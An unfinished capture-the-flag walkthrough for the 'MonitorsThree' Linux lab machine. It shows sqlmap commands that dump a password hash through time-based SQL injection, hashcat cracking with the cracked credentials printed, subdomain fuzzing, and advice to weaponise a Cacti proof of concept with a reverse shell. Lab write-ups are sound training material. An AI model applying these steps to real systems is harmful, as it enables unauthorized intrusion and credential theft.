---
authors:
    - Jiri Raja
date: 08-10-2025
---
# MonitorsThree
Linux machine

## Foothold

Do not forget to update the `/etc/hosts` file.

### Nmap port scan

```shell
nmap -sV -v 10.10.11.30
```

visit the website. We will find login and "request password change" page.

We will try using sqlmap.

```shell
sqlmap -u http://monitorsthree.htb/forgot_password.php --data username=asd -p username
```

Since its time-based injection, try to predict and optimise the command:

```shell
sqlmap -u http://monitorsthree.htb/forgot_password.php --data username=asd -p username -D monitorsthree_db -T users -C password --dump --time-sec 1 --where "username='admin'"
```

crack the md5 password (first save the hash into file):
```shell
hashcat -m 0 hash rockyou.txt
```

result:
```text
31a181c8372e3afc59dab863430610e8:greencacti2001
```

[//]: # (TODO: there is a way to use error-based enumeration or injection or what it is called)

Next we can enumerate subdomains:
```shell
ffuf -w /usr/share/wordlists/dirb/big.txt -H "Host: FUZZ.monitorsthree.htb" -u http://monitorsthree.htb -fs 1590
```

We found a cacti subdomain. Add it to /etc/hosts. Use the found credentials.

Optionally we can try to check for the users, since the response is different when the user exists. ("Login failed" vs "Login Failed")

Use `admin:greencacti2001`.

Search for an exploit for the cacti 1.2.26 version.

We find https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88.

Use the poc to generate the payload (copy the contents into a file, update the dummy code with reverse shell, preferably python reverse shell) and follow the instructions.

Do not forget to start a shell listener.

## User
Find a database credentials in the application (in `/var/www/html/cacti/include/config.php`).

In the database, there is a users table, we want the marcus user password.

```shell
mysql -u cactiuser -p <<< cactiuser
show databases;
use cacti;
show tables;
select * from user_auth;
```

Crack it:
```shell
hashcat -a 0 -m 3200 hash rockyou.txt
```

result:
```text
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

Now we login as marcus, use the password we just found:
```shell
su marcus
```

Read the user flag.

## Root
Use the 

[//]: # (TODO: finish)

Read the flag.
